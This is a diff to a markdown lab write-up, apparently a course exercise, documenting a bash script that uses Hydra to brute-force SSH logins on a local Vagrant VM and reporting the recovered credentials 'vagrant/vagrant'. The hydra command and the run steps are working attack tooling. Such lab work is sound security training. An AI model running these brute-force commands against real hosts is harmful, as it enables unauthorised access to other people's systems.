@@ -2,6 +2,9 @@
 # Task 1.2 – SSH Brute-force Using Custom Script (Hydra)
 
 ## Script File: ssh_bruteforce.sh
+This script uses **Hydra** to perform an SSH brute-force attack on IP `192.168.56.6`  
+with the username `vagrant`, trying passwords from `passwords.txt`.  
+It runs 4 attempts in parallel and stops when a correct password is found.
 ```bash
 #!/bin/bash
 # Configuration
@@ -16,6 +19,7 @@ hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
 ![Script created](./screenshots/08_script_created.png)
 
 ## Execution Steps
+The script executed successfully. Hydra found the correct SSH login credentials: vagrant / vagrant. The attack stopped after identifying the valid password.
 ```bash
 chmod +x ssh_bruteforce.sh
 ./ssh_bruteforce.sh
